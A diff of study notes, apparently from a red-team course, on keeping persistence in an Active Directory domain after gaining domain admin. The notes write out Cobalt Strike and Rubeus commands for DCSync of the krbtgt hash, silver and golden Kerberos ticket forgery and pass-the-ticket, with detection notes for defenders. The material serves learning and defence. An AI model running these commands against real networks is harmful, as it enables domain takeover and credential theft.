@@ -1,5 +1,55 @@
 if we have gained domain admin privs, we can now extract highly-sensitive authentication material to maintain persistence
 
-dcsync
-ticket forgery
+dcsync:
+    technique where an adversary leverages the directory replication service (DRS) protocol to pull replication data from a DC
+        specifically targeting usernames and password hashes
+    we can use mimikatz or the built in dcsync alias
+    a common target would be obtaining the password hash for the krbtgt account
+        once we have this, we can forge a valid TGT for any user in the domain since this is whats used to encrypt and sign TGS
+        e.g. beacon> dcsync contoso.com CONTOSO\krbtgt
+    OPSEC: as DRS is legitimately used, defenders must look for anomalous replication requests (logged as 4662)
+
+ticket forgery:
+    technique where an adversary uses stolen secrets to create their own keberos ticket offline and inject into logon session
+    known as a silver ticket:
+        kerberos ticket that has been forged using a service's secret and targets a specfic service
+        once we compromise a machine, we can dump its password hash to forge service tickets
+            e.g. PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/lon-db-1 /aes256:bc6fd6e8519b52e09f60961beeee083a441c25908e30a6c29b124b516e06945f /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
+                where...
+                    /service is the target service
+                    /aes256 is the hash of the target computer account
+                    /user is the user to impersonate
+                    /domain is the FQDN of the copmuter's domain
+                    /sid is the domain SID
+            this will dump a service ticket!
+        beacon> make_token CONTOSO\Administrator FakePass
+        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TGS]
+        other uses for silver tickets:
+            kerberoasting other services:
+                say we have the plaintext password of domain account running MSSQL service
+                we can use the service's secret to forge a service ticket impersonating a user who has sysadmin privs
+                    convert the plaintext creds to its hash:
+                        PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /user:mssql_svc /domain:CONTOSO.COM /password:Passw0rd!
+                    forge ticket for MSSQLSvc/lon-db-1.contoso.com
+                        PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:MSSQLSvc/lon-db-1.contoso.com:1433 /rc4:FC525C9683E8FE067095BA2DDC971889 /user:rsteel /id:1108 /groups:513,1106,1107,4602 /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
+                            where...
+                                /id is the RID for the user with sysadmin privs
+                                /groups is groups memberships (domain users, workstation admins, server admins, database admins)
+                    impersonate user:
+                        beacon> make_token CONTOSO\rsteel FakePass
+                        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TGT]
+        OPSEC: silver tickets may be denied if PAC validation is enabled on the computer
+               they may be detected as there is no TGS-REQ (4769) event logged before the TGS-REP (4624) since they are forged offline
+               they may also be detected if they're forged with inaccurate or anomalous information
+                e.g. domain name should be in all caps!
+    another technique is forging a TGT that has been signed with the KDC's secret (obtained via DCSync)
+    known as a golden ticket:
+        using the KDC's secret:
+            PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:[secret] /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
+                where...
+                    /aes256 is the hash for the krbtgt account
+                    /user is the username to impersonate
+                    /domain is the current domain
+                    /sid is the current domain's SID
+
 dpapi backup keys
